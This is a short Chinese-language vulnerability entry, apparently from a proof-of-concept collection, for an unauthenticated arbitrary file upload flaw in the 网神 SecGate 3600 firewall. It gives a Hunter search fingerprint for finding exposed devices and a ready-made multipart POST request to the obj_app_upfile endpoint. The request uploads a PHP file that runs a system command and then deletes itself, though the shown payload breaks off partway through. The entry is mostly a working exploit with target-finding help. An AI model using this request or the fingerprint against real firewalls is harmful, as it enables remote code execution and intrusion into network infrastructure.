# 网神SecGata3600防火墙obj_app_upfile任意文件上传漏洞

- **系统**：网神SecGata3600防火墙obj_app_upfile　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`hunter:`app.name="网神 SecGate"&&web.title=="网神SecGate 3600防火墙"``
- **请求**：`POST /?g=obj_app_upfile HTTP/1.1`

**请求体 / payload**
```
没有对文件调用进行鉴权，且文件上传路径为可访问路径，造成任意文件上传
Host: xx.xx.xx.xx
Content-Length: 569
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"
10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="upfile"; filename="test.php"
Content-Type: text/plain
<?php system("id");unlink(__FILE__);?>
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"
obj_app_upfile
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: …（脚本共 775 字，完整版见原文）
```

**其他**
- 网神SecGata 3600防火墙obj\_app\_upfile任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 网神SecGata 3600防火墙